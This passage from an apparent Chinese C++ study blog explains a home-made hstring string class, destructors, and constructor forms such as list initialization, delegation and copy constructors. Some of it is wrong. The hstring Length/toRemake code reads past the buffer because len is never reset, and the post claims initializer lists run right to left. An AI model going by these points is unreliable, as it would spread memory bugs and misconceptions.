&lt; <span class="keyword">this</span>-&gt;len; i++)&#123;</span><br><span class="line">c_str[i] = hs[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">toShow</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> c_str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">toLength</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">hstring</span>()&#123;</span><br><span class="line"><span class="keyword">delete</span>[] c_str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;hstring.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="function">hstring <span class="title">str</span><span class="params">(<span class="string">&quot;hahah&quot;</span>)</span></span>;</span><br><span class="line">std::cout &lt;&lt; str.<span class="built_in">toShow</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为没涉及到重载，只能通过成员函数先打印将就一下了。</p><img src="/2022/06/23/hstring/000.png" class=""><p>结果也是ok的，至于那个toLength是因为我记得string好像也有个调用可以显示长度的方法，就干脆放在public下面调用得了。<br>至于len本质上是存放长度肯定不希望被其他人调用就放在私有里面，然后Length的话，本质上跟sizeof有点相似，它会计算字符串结尾的<code>\0</code>，想要strlen的效果就让返回值-1就行了。</p><img src="/2022/06/23/hstring/001.png" class=""><p>至于中文占2个字节的问题先不考虑。</p><img src="/2022/06/23/hstring/002.png" class=""><p>到这里构造没啥事了，下面就是拷贝的问题。</p><hr><h2 id="拷贝"><a href="#拷贝" class="headerlink" title="拷贝"></a>拷贝</h2><p>拷贝就难在没有[]重载运算。hstring是自己定义的类。<br>你要想让<code>hstring strA(str);</code> 还要注意不能让两个地址相同，不然前面的被释放了，后面的就无效了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;hs)&#123;</span><br><span class="line">    c_str = hs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样肯定行不通，c_str是char*类型，hs是hstirng类型的，强转上逻辑也不对，因为没有调出hs.c_str这种东西。</p><p>使用列表传递的话，就要再次调用toShow函数，但是这里的hs是const类型，所以toShow也要加上const</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;hs):<span class="built_in">hstring</span>(hs.<span class="built_in">toShow</span>())&#123;</span><br><span class="line">    <span class="comment">//c_str = hs;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">toShow</span><span class="params">()</span> <span class="type">const</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c_str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样编译是通过了，但是要看看效果。</p><img src="/2022/06/23/hstring/003.png" class=""><p>看到效果ok。</p><hr><h2 id="印证"><a href="#印证" class="headerlink" title="印证"></a>印证</h2><p>最后无非就是印证销毁的时候strA还是不是正常的。<br>这个讲道理是不好印证的，因为str先声明的，strA后声明的，你也没办法指定它执行析构函数，这个还是由编译器认的。</p><p>所以顺序上没法印证，那就只能通过改变str，查看strA的结果还是否相同，去印证是不是一个内存地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">toRemake</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *hs)</span></span>&#123;</span><br><span class="line">    <span class="keyword">delete</span>[] c_str;</span><br><span class="line">    c_str = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">Length</span>(hs)];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>-&gt;len; i++)&#123;</span><br><span class="line">        c_str[i] = hs[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是老样子传递const char*, 然后先释放原有的内存，因为不能保证c_str是否之前分配过了，然后在赋予新的内存。老样子循环抄写hs，这里用不用memcpy都随便。</p><img src="/2022/06/23/hstring/004.png" class=""><p>效果不同，说明strA和str使用的不是同一个内存。</p><hr><h2 id="完整的hstring-h"><a href="#完整的hstring-h" class="headerlink" title="完整的hstring.h"></a>完整的hstring.h</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hstring</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *c_str;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> len=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">Length</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *hs)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (hs[<span class="keyword">this</span>-&gt;len++]);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">hstring</span>()&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span>* hs)&#123;</span><br><span class="line">c_str = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">Length</span>(hs)];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>-&gt;len; i++)&#123;</span><br><span class="line">c_str[i] = hs[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;hs):<span class="built_in">hstring</span>(hs.<span class="built_in">toShow</span>())&#123;</span><br><span class="line"><span class="comment">//c_str = hs;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">toShow</span><span class="params">()</span> <span class="type">const</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> c_str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">toLength</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">toRemake</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *hs)</span></span>&#123;</span><br><span class="line"><span class="keyword">delete</span>[] c_str;</span><br><span class="line">c_str = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">Length</span>(hs)];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>-&gt;len; i++)&#123;</span><br><span class="line">c_str[i] = hs[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">hstring</span>()&#123;</span><br><span class="line"><span class="keyword">delete</span>[] c_str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>优化空间肯定还有的，重载就是一个点。<br>还有就是功能上还是丐版阶段。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>析构函数</title>
      <link href="/2022/06/23/destructor/"/>
      <url>/2022/06/23/destructor/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>构造函数是在类对象创建时就调用，一般的用途就是初始化对象。<br>而析构函数相反，它是在类的对象结束生命周期才自动执行，一般就是清理之类的，最常见就是释放掉new的空间</p><span id="more"></span><p>格式也挺特殊，是在类名前加一个<code>~</code><br>全称：<code>~类名()&#123;&#125;</code></p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>析构函数名也应与类名相同，只是在函数名前面加一个位取反符<del>，例如</del>stud( )，以区别于构造函数。它不能带任何参数，也没有返回值（包括void类型）。只能有一个析构函数，不能重载。如果用户没有编写析构函数，编译系统会自动生成一个缺省的析构函数（即使自定义了析构函数，编译器也总是会为我们合成一个析构函数，并且如果自定义了析构函数，编译器在执行时会先调用自定义的析构函数再调用合成的析构函数），它也不进行任何操作。所以许多简单的类中没有用显式的析构函数。——百度</p><p>这个析构主要就是应对动态分配的内存，需要手动销毁，因为其它的成员变量该结束编译器会自动处理掉。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;默认构造函数执行&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Box</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;析构函数执行&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Box box;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/23/destructor/000.png" class=""><p>看到实例化一个类的时候他就会顺序执行构造函数和析构函数。</p><p>这样可能不够直观，因为就之创建了一个类，可以简单在main函数里输出点什么。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Box box;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hhhh&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hhhh&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hhhh&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hhhh&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/23/destructor/001.png" class=""><p>也就是说当这个程序即将结束时，它会自动调用类中的析构函数，释放掉该释放的东西，当然这里因为还没动态分配只是做个示范。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> *ch;</span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line">ch = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">100</span>];</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;默认构造函数执行&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Box</span>()&#123;</span><br><span class="line"><span class="keyword">delete</span>[] ch;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;析构函数执行&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当类中声明了一个指针，然后在构造函数里动态分配内存，如果析构函数不执行delete。那么内存就会一直堆积下去。</p><p>因为虽然对象会自动释放，但是它释放的都是存在栈中的内存，这里的指针ch会释放，但是分配给它的100*4的内存不会主动释放。这块内存在正常情况下就不能被访问了。</p><p>然后前面构造函数有个default关键字保留，析构也能用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;默认构造函数执行&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Box</span>() = <span class="keyword">default</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当然效果都差不多，如果函数里要写东西自然就不用这种方式。</p><blockquote><p>再次重复：&#x3D;default 是c++11的特性，目的就是会自动生成函数体，在不需要写内容的时候效率更高。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>析构函数雀食没啥好讲的。</p><p>学到此处就是知道编译器会自动对类生成构造函数、副本构造函数、析构函数。</p><p>副本构造或者拷贝构造叫法都差不多~</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构造函数+1</title>
      <link href="/2022/06/23/Constructor1/"/>
      <url>/2022/06/23/Constructor1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续了解构造函数</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="列表初始化"><a href="#列表初始化" class="headerlink" title="列表初始化"></a>列表初始化</h2><p>构造函数最直接的就是初始化成员变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Hack</span>(<span class="type">int</span> hp,<span class="type">int</span> mp)&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;hp = hp;</span><br><span class="line"><span class="keyword">this</span>-&gt;mp = mp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>除了在函数里面初始化，还可以使用列表方式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Hack</span>(<span class="type">int</span> _hp, <span class="type">int</span> _mp) :hp&#123; _hp &#125;,mp&#123;_mp&#125;&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>列表初始化的话就不能用this指针了，所以你要手动去区分开形参和成员变量，就是不要起一个名字</strong></p><p>那么说这两种都是初始化的方法，谁更好<br>答案是列表更好</p><ol><li>效率高</li><li>在某些情况下只能用列表初始化</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp=<span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> mp=<span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Hack</span>(<span class="type">int</span> _hp, <span class="type">int</span> _mp)&#123;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; hp &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; mp &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">this</span>-&gt;hp = _hp;</span><br><span class="line"><span class="keyword">this</span>-&gt;mp = _mp;</span><br><span class="line">std::cout &lt;&lt; hp &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; mp &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当hp和mp有初始值，我们去看看执行的效果</p><img src="/2022/06/23/Constructor1/000.png" class=""><p>可以看到先打印初始值在打印修改后的值<br>说明构造函数需要跳转需要空间。</p><p>再看看列表的情况。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp=<span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> mp=<span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Hack</span>(<span class="type">int</span> _hp, <span class="type">int</span> _mp):hp&#123; _hp &#125;,mp&#123;_mp&#125;&#123;</span><br><span class="line">std::cout &lt;&lt; hp &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; mp &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; hp &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; mp &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/23/Constructor1/001.png" class=""><p>看到都是实例化对象时候的值。<br>说明列表的方法实现是在执行函数之前完成的。</p><blockquote><p>说明列表初始化的效率比传统在构造函数里初始化要快<br>至于某些情况要到继承的时候才知道</p></blockquote><p>有优势就有劣势，在劣势方面，因为成员变量是顺序初始化，他没有等函数入栈前去看默认的值，但是如果调用的是未初始化的然后用来赋值就会造成问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> h;</span><br><span class="line"><span class="type">int</span> hp=<span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> mp=<span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">Hack</span>(<span class="type">int</span> _hp, <span class="type">int</span> _mp) :hp&#123; _hp &#125;, mp&#123; _mp &#125;, h&#123; mp * <span class="number">3</span> &#125;&#123;</span><br><span class="line">std::cout &lt;&lt; hp &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; mp &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; h &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; hp &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; mp &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; h &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2022/06/23/Constructor1/002.png" class=""><p>会发现h肯定不会这么大。说明传递的时候mp的值不正常。</p><p>原理就是，传参是从右往左传递，h声明的比mp早，mp还没完成初始化是个随机值，如果h声明在mp之下，那值就正常了。</p><img src="/2022/06/23/Constructor1/003.png" class=""><p>只不过这种方式只是治标不治本，因为成员变量一多，没人回去顾及这些顺序问题，</p><p><strong>所以列表初始化的顺序是从右往左的，传统构造函数内初始化是因为调用函数之前，成员变量都已经完成了各自的初始化</strong></p><hr><h2 id="委托构造"><a href="#委托构造" class="headerlink" title="委托构造"></a>委托构造</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> hp=<span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> mp=<span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> h;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Hack</span>(<span class="type">int</span> _h, <span class="type">int</span> _hp):<span class="built_in">Hack</span>(_h) &#123;</span><br><span class="line">std::cout &lt;&lt; h &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; hp &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; h &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; hp &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Hack</span>(<span class="type">int</span> _h) :h&#123; _h &#125;&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hack _h&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/23/Constructor1/004.png" class=""><p>会发现他先执行了<code>_h</code>的构造函数。</p><p><strong>委托构造函数只能用一个，且使用了委托构造之后不能再用列表初始化的方式了</strong></p><hr><h2 id="副本构造函数"><a href="#副本构造函数" class="headerlink" title="副本构造函数"></a>副本构造函数</h2><p>之前也用到过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hack ha;</span><br><span class="line"><span class="function">Hack <span class="title">hc</span><span class="params">(ha)</span></span>;</span><br></pre></td></tr></table></figure><p>其实就是一种拷贝的操作，编译器也同样为类指定了一个默认的副本构造函数，当然也可以手动指定。</p><img src="/2022/06/23/Constructor1/005.png" class=""><p>看到这种右值引用的类型是我们没有写过的，这就是编译器自动产生的副本构造。</p><p>手写起来也不难</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Hack</span>(Hack &amp;hack)&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;hp = hack.hp;</span><br><span class="line"><span class="keyword">this</span>-&gt;mp = hack.mp;</span><br><span class="line"><span class="keyword">this</span>-&gt;h = hack.h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果秉持不想改变这个传递的hack对象，也可以加上<code>const</code>。取决于个人严谨程度，毕竟只是为了拷贝，万一被修改了也怪麻烦的。</p><p>然后就是利用列表的形式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Hack</span>(Hack &amp;hack) :hp&#123; hack.hp &#125;, mp&#123; hack.mp &#125;, h&#123; hack.h &#125;&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>活学活用。</p><blockquote><p>虽然&#x3D;也是会默认调用副本构造，但是第二次在使用&#x3D;意义不同，因为第一次才是真正的构造这个类，第二次只是修改或者替换。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>同类型的类，在构造函数里是可以访问私有成员的。<br>构造函数目的就是初始化构造一个类。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构造函数</title>
      <link href="/2022/06/23/Constructor/"/>
      <url>/2022/06/23/Constructor/</url>
      
